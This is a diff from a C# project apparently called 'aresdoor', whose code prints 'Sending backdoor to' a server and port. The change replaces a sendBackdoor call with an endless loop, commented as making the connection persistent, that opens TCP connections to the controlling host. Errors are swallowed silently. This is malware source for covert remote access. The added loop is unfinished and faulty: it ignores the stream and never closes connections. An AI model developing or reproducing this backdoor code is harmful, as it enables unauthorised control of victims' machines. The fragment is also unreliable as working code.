@@ -213,7 +213,18 @@ namespace aresdoor
                     try
                     {
                         Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port);
-                        sendBackdoor(server, port);
+
+                        // Write in loop for a persistant connection
+                        while (true)
+                        {
+                            // Define a couple of variables that set our connection target
+                            TcpClient client = new System.Net.Sockets.TcpClient(server, port);
+                            NetworkStream stream = client.GetStream();
+
+
+                        }
+
+                        // sendBackdoor(server, port);
                     }
                     catch (Exception exc)
                     { Console.WriteLine(exc.Message); } // pass silently unless debug mode is enabled
